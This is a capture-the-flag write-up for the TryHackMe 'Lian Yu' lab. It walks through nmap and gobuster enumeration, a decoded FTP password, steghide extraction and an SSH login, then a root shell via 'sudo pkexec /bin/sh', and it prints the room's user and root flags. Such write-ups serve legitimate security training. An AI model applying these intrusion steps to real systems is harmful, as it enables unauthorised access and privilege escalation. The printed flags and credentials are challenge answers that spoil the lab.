# Lian Yu Writeup (TryHackMe)

## Overview

The Lian Yu room is a challenge focused on enumeration, steganography, and privilege escalation. The objective is to gain access to the system and retrieve both user and root flags.

---

## Tools Used

* nmap
* gobuster
* ftp
* exiftool
* steghide
* ssh

---

## 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.49.152.100
```

Open ports:

* 21 (FTP)
* 22 (SSH)
* 80 (HTTP)

---

## 2. Web Enumeration

### Gobuster

```bash
gobuster dir -u http://10.49.152.100/ \
-w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

Discovered directory:

```
/island/
```

---

## 3. Hidden Clue

Inside `/island/`, a message reveals the code word:

```
vigilante
```

---

## 4. Further Enumeration

```bash
gobuster dir -u http://10.49.152.100/island \
-w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
```

Discovered:

```
/2100/
```

---

## 5. Ticket File

```bash
gobuster dir -u http://10.49.152.100/island/2100 \
-w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .ticket
```

File found:

```
green_arrow.ticket
```

Content:

```
RTy8yhBQdscX
```

Decoded:

```
!#th3h00d
```

---

## 6. FTP Access

```bash
ftp 10.49.152.100
```

Credentials:

* Username: vigilante
* Password: !#th3h00d

Downloaded files:

* Leave_me_alone.png
* Queen's_Gambit.png
* aa.jpg

---

## 7. Steganography

### Metadata Analysis

```bash
exiftool Leave_me_alone.png
```

Hint discovered:

```
password
```

### Extract Hidden Data

```bash
steghide extract -sf aa.jpg
```

Extracted files:

* passwd.txt
* shado

---

## 8. SSH Access

Discovered password:

```
M3tahuman
```

Login:

```bash
ssh slade@10.49.152.100
```

---

## 9. User Flag

```bash
cat user.txt
```

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

---

## 10. Privilege Escalation

```bash
sudo -l
```

Execute:

```bash
sudo pkexec /bin/sh
```

---

## 11. Root Flag

```bash
cat root.txt
```

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
